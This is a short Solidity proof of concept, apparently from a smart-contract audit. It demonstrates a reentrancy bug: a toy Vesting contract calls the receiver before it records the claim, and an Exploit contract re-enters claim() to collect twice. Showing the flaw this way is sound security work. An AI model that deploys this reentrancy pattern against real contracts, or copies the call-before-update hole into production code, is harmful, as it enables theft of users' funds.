// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IClaimReceiver { function reenter() external; }
contract Vesting { uint256 public index; uint256 public amount=100; bool public claimed; function claim(address receiver) external { require(index==0,"already claimed"); uint256 payout=amount;
        // @> (bool sent,) = payable(sender).call{value:pctAmount}("") before s.index is updated
        IClaimReceiver(receiver).reenter(); index=1; claimed=true; } }
contract Exploit is IClaimReceiver { Vesting public vesting; uint256 public calls; bool public harmed; event Proof(uint256 calls);
    function run() external { vesting=new Vesting(); vesting.claim(address(this)); harmed=calls==2; emit Proof(calls); require(harmed,"reentrancy blocked"); }
    function reenter() external { require(msg.sender==address(vesting)); if(calls++==0) vesting.claim(address(this)); }
}
